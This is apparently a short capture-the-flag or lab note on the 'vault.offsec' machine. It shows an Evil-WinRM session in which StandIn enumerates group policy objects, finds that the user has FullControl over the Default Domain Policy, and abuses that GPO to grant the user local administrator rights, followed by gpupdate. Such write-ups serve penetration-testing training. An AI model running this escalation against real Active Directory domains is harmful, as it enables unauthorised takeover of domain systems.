# Abuse GPO

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#find-vulnerable-gpo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#find-vulnerable-gpo)

[https://github.com/FuzzySecurity/StandIn/releases\
\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-standin](https://github.com/FuzzySecurity/StandIn/releaseshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-standin)

```
*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo
[?] Object   : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}
    Path     : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Controllers Policy
    CN                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCMachineExtensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 8:50:33 AM

[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Policy
    CN                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCMachineExtensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 9:00:32 AM

*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --acl
[+] Account       : VAULT\anirudh
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : None
    
*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --localadmin anirudh
*Evil-WinRM* PS C:\Users\anirudh\Desktop> gpupdate /force
```

Login again.
